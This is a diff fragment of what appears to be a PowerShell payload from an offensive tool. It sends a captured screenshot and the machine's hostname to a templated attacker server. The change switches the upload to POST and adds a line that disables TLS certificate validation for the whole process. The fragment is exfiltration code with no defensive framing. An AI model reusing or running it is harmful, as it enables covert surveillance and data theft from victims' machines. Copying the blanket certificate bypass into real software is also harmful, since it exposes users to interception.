@@ -10,4 +10,5 @@ $bmp.Dispose();
 $URL='SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/?';
 $headers=@{'Proof'='1'};
 $params=@{hostname=$hostname;screenshot=$screenshot};
-Invoke-WebRequest -Uri $URL -Headers $headers -Method GET -Body $params;
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
+Invoke-WebRequest -Uri $URL -Headers $headers -Method POST -Body $params;
